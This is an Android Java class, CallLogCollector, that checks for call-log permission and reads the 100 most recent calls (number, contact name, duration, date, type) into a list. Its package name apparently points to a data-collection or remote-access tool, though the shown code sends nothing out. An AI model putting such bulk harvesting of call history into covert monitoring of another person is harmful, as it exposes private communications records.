package com.ultimate.access.collectors;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;

import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CallLogCollector {

    private Context context;

    public CallLogCollector(Context context) {
        this.context = context;
    }

    public List<Map<String, Object>> getCallLogs() {
        List<Map<String, Object>> callLogs = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            return callLogs;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 100"
        );

        if (cursor != null) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

            while (cursor.moveToNext()) {
                Map<String, Object> call = new HashMap<>();

                if (numberIndex != -1) {
                    call.put("number", cursor.getString(numberIndex));
                }

                if (nameIndex != -1) {
                    call.put("name", cursor.getString(nameIndex));
                } else {
                    call.put("name", "");
                }

                if (durationIndex != -1) {
                    call.put("duration", cursor.getLong(durationIndex));
                }

                if (dateIndex != -1) {
                    call.put("date", new Date(cursor.getLong(dateIndex)));
                }

                if (typeIndex != -1) {
                    int type = cursor.getInt(typeIndex);
                    String typeString = "UNKNOWN";
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeString = "INCOMING";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeString = "OUTGOING";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeString = "MISSED";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeString = "REJECTED";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeString = "BLOCKED";
                            break;
                    }
                    call.put("type", typeString);
                }

                callLogs.add(call);
            }
            cursor.close();
        }

        return callLogs;
    }
}